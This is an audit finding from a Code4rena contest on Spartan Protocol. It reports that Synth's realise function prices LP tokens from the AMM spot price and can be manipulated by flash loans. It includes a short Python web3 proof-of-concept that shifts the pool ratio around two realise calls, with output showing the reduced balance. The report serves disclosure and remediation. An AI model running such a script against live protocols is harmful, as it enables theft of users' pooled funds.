---
# Core Classification
protocol: Spartan Protocol
chain: everychain
category: uncategorized
vulnerability_type: twap

# Attack Vector Details
attack_type: twap
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 490
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2021-07-spartan-protocol-contest
source_link: https://code4rena.com/reports/2021-07-spartan
github_link: https://github.com/code-423n4/2021-07-spartan-findings/issues/40

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.80
financial_impact: high

# Scoring
quality_score: 4
rarity_score: 5

# Context Tags
tags:
  - twap

protocol_categories:
  - dexes
  - cdp
  - services
  - yield_aggregator
  - rwa

# Audit Details
report_date: unknown
finders_count: 2
finders:
  - adelamo_
  - jonah1005
---

## Vulnerability Title

[H-05] Synth realise is vulnerable to flash loan attacks

### Overview


A bug report has been submitted about a vulnerability in the Synth `realise` function, which calculates `baseValueLP` and `baseValueSynth` based on the AMM spot price. It is vulnerable to a flash loan attack, where a big whale of the lp token holders could keep calling realse by shifting the token ratio of the AMM pool back and forth. The vulnerability is located in two sections of code in the GitHub repository. A proof of concept script is provided with an output that demonstrates the vulnerability. 

No tools are used to mitigate the vulnerability. The recommended mitigation steps are to calculate the token's price from a reliable source, such as a TWAP oracle or a Chainlink oracle. Another option is to calculate the lp token value based on an anti-flash loan formula, such as Alpha Finance's formula.

### Original Finding Content

## Handle

jonah1005


## Vulnerability details

## Impact
Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio. 

The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.


## Proof of Concept
The vulnerability locates at:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199

Where the formula here is dangerous:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126

https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217
Here's a script for conducting flashloan attack
```python
flashloan_amount = init_amount
user = w3.eth.accounts[0]
marked_token.functions.transfer(user, flashloan_amount).transact()
marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})
token_pool.functions.addForMember(user).transact({'from': user})
received_lp = token_pool.functions.balanceOf(user).call() 
synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
token_synth.functions.realise(token_pool.address).transact()
token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})
token_pool.functions.removeForMember(user).transact({'from': user})
token_synth.functions.realise(token_pool.address).transact()
synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()
print('synth_lp_balance_after_realise', synth_balance_after_realise)
print('synth_lp_balance_before_realise', synth_balance_before_realise)

```
Output:
```
synth_balance_after_realise 1317859964829313908162
synth_balance_before_realise 2063953488372093023256
```
## Tools Used
None

## Recommended Mitigation Steps
Calculating Lp token's value base on AMM protocol is known to be dangerous.
There are a few steps that might solve the issue:
1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.
2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 4/5 |
| Rarity Score | 5/5 |
| Audit Firm | Code4rena |
| Protocol | Spartan Protocol |
| Report Date | N/A |
| Finders | adelamo_, jonah1005 |

### Source Links

- **Source**: https://code4rena.com/reports/2021-07-spartan
- **GitHub**: https://github.com/code-423n4/2021-07-spartan-findings/issues/40
- **Contest**: https://code4rena.com/contests/2021-07-spartan-protocol-contest

### Keywords for Search

`TWAP`

